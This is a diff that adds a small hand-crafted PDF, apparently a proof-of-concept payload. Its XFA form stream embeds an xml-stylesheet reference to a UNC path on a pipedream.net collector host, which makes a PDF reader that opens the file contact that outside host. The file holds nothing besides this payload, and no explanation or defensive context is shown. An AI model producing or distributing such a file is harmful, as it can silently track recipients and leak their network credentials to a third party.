@@ -1,0 +1,26 @@
+%PDF-
+
+1 0 obj <<>>
+stream
+<?xml version="1.0" ?>
+<?xml-stylesheet href="\\enmrdee785hri.x.pipedream.net/\whatever.xslt" type="text/xsl" ?>
+endstream
+endobj
+trailer <<
+    /Root <<
+
+        /AcroForm <<
+            /Fields [<<
+                /T (0)
+                /Kids [<<
+                    /Subtype /Widget
+                    /Rect []
+                    /T ()
+                    /FT /Btn
+                >>]
+            >>]
+            /XFA 1 0 R
+        >>
+        /Pages <<>>
+    >>
+>>
